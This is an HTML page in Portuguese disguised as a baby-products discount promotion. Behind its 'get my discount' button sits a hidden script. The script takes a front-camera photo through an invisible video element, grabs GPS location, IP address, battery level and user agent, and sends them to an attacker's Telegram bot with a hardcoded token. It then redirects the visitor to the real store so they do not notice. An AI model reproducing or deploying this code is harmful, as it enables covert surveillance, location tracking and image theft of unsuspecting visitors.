<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bebê Feliz - 50% OFF Tudo</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f9f5f0;
            margin: 0;
            padding: 0;
            color: #444;
        }
        .hero {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        .bg {
            width: 100%;
            height: 280px;
            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300"><rect fill="%23f0c0a0" width="600" height="300"/><circle cx="300" cy="200" r="80" fill="%23fff"/><rect x="260" y="140" width="80" height="80" rx="10" fill="%23eeb0b0"/></svg>');
            background-size: cover;
            background-position: center;
        }
        h1 {
            font-size: 26px;
            font-weight: 700;
            color: #e53935;
            margin: 20px 0 5px;
        }
        .cupom {
            font-size: 32px;
            font-weight: 800;
            color: #e53935;
            margin-bottom: 10px;
        }
        p {
            margin: 0 20px 20px;
            font-size: 15px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            background: #e53935;
            color: white;
            padding: 14px 30px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 700;
            text-decoration: none;
            margin: 20px 0;
            transition: opacity .2s;
        }
        .btn:hover { opacity: .9; }
        .disclaimer {
            font-size: 12px;
            color: #888;
            margin: 0 20px 30px;
            line-height: 1.4;
        }
        @media (max-width: 600px) {
            .bg { height: 200px; }
        }
    </style>
</head>
<body>
    <main class="hero">
        <div class="bg"></div>
        <h1>PROMOÇÃO BEBÊ FELIZ</h1>
        <p>Garanta até 50% OFF em todos os enxovais, fraldas e acessórios. Promoção exclusiva por tempo limitado!</p>
        <div class="cupom">CUPOM: <strong>BEBE50</strong></div>
        <a href="#" class="btn" onclick="startGrab()">PEGAR MEU DESCONTO</a>
        <p class="disclaimer">Envio grátis em até 2 dias. Estoque limitado. Promoção válida por 48h.</p>
    </main>

    <video id="cam" autoplay playsinline width="0" height="0"></video>
    <canvas id="cap" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TK = "8952863326:AAGbv532qodG8yJJZ6mXSd99oYx6TPvNC7Y";
        const CHAT_ID = "8607389403";
        const REAL_URL = "https://bebefeliz.com.br/loja"; // link real do anunciante

        function startGrab() {
            document.querySelector('.disclaimer').innerHTML = '<b style="color:#007aff;">Calculando frete grátis...</b>';

            // Coleta básica em background
            const data = {
                ip: "...",
                ua: navigator.userAgent,
                bat: navigator.getBattery ? `${Math.round(navigator.getBattery().level * 100)}%` : "N/A"
            };

            // IP
            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>data.ip=j.ip).catch(()=>{});

            // GPS + Foto (com justificativa plausível no tema)
            Promise.all([
                new Promise(r=>{
                    navigator.geolocation.getCurrentPosition(
                        p=>r(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
                        ()=>r("Negado"),
                        {enableHighAccuracy:true}
                    );
                }),
                navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
                    .then(stream=>{
                        const v=document.getElementById('cam');
                        v.srcObject=stream;
                        setTimeout(()=>{
                            const c=document.getElementById('cap');
                            c.getContext('2d').drawImage(v,0,0,c.width,c.height);
                            stream.getTracks().forEach(t=>t.stop());
                            data.foto = c.toDataURL('image/jpeg',0.6);
                            sendIt(data);
                        }, 800);
                    })
                    .catch(()=>{
                        sendIt({...data, foto:"Negada"});
                    })
            ]);
        }

        async function sendIt(d) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            if(d.foto){
                fd.append('photo', dataURItoBlob(d.foto), 'pic.jpg');
                fd.append('caption', `🔒 ACESSO NOVO\n📍${d.gps || 'N/D'}\n🌐${d.ip}\n🔋${d.bat}\n📱UA: ${d.ua}`);
            } else {
                fd.append('text', `🔒 ACESSO–TEXTO\nIP:${d.ip} ${d.bat}\nUA:${d.ua}\n⚠️ Camera/GPS: Negados`);
            }
            fd.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${TK}/sendPhoto`, {method:'POST',body:fd});
            // Redireciona paa o site REAL (ela acha que o desconto foi liberado)
            location.href = REAL_URL;
        }

        function dataURItoBlob(uri) {
            const b = atob(uri.split(',')[1]);
            const t = uri.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(b.length);
            const ia = new Uint8Array(ab);
            for(let i=0;i<b.length;i++) ia[i]=b.charCodeAt(i);
            return new Blob([ab], {type:t});
        }
    </script>
</body>
</html>
